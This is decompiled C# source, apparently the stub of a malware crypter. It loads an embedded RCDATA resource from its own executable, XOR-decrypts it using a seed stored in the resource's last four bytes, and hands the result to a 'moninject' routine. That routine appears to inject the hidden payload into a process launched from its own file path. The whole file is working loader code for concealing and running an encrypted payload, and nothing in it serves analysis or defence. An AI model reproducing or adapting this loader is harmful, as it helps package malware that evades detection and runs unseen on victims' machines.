using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using WindowsApplication;

namespace ns0;

[StandardModule]
internal sealed class Class9
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_0, string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	public static void smethod_0()
	{
		string string_ = Process.GetCurrentProcess().MainModule!.ModuleName;
		IntPtr moduleHandleA = GetModuleHandleA(ref string_);
		IntPtr intptr_ = FindResource(moduleHandleA, "0", "RT_RCDATA");
		IntPtr source = LoadResource(moduleHandleA, intptr_);
		int num = SizeofResource(moduleHandleA, intptr_);
		checked
		{
			byte[] array = new byte[num - 1 + 1];
			Marshal.Copy(source, array, 0, num);
			int seed = BitConverter.ToInt32(array, array.Length - 4);
			array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[array.Length - 3 + 1]);
			Random random = new Random(seed);
			byte[] array2 = new byte[array.Length - 1 + 1];
			random.NextBytes(array2);
			int num2 = array.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				array[i] = unchecked((byte)(array[i] ^ array2[i]));
			}
			ganjaman ganjaman = new ganjaman();
			ganjaman.moninject(array, Process.GetCurrentProcess().MainModule!.FileName);
		}
	}
}
